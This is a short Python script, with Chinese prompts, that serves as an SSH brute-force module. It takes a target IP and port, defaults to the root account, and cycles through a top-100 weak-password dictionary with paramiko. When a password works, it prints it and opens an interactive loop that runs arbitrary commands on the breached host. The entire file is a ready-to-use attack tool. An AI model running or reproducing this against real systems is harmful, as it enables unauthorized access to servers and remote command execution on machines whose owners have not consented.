import paramiko

ssh_default_username = 'root'
ssh_input_char = '#'
ssh_exit_command = {'quit', 'exit', 'quit()', 'exit()'}
ssh_password_dic = "./PasswordDic/top100_ssh_vps.txt"
ssh_password_list = ''


def get_password_dic(password_dic_path):
    with open(file=ssh_password_dic, mode='r+', encoding='utf-8') as file:
        return file.readlines()


def ssh_password_retry(host, port, username, password_list):
    flag = True
    for password in password_list:
        password = password.replace("\r", "").replace("\n", "")
        ssh_client = paramiko.SSHClient()
        try:
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(hostname=host, port=port, username=username, password=password)
            print(f"[{host}:{port}]爆破密码成功 -> [{password}]")
            while flag:
                ssh_command_in = input(f'[ssh@{host}:{port}]{ssh_input_char}')
                if ssh_exit_command.__contains__(ssh_command_in):
                    print("退出......")
                    flag = False
                if flag:
                    stdin, stdout, stderr = ssh_client.exec_command(ssh_command_in)
                    result = stdout.read().decode('utf-8')
                    print(result)
        except paramiko.ssh_exception.AuthenticationException:
            print(f"尝试密码[{password}]错误")
        finally:
            ssh_client.close()
            if not flag:
                break


# SSH密码爆破
def ssh_blasting():
    print("[SSH弱口令爆破子模块]")
    host = input("输入目标IP地址: ")
    port = input("输入目标端口: ")
    username = input("您要使用默认用户名吗?默认为root: ")
    if username == '':
        username = 'root'
    dic = input("您要使用默认SSH弱口令字典吗?默认为y [y/n]: ")
    if dic != 'n':
        pass_list = get_password_dic(ssh_password_dic)
        ssh_password_retry(host, port, username, pass_list)
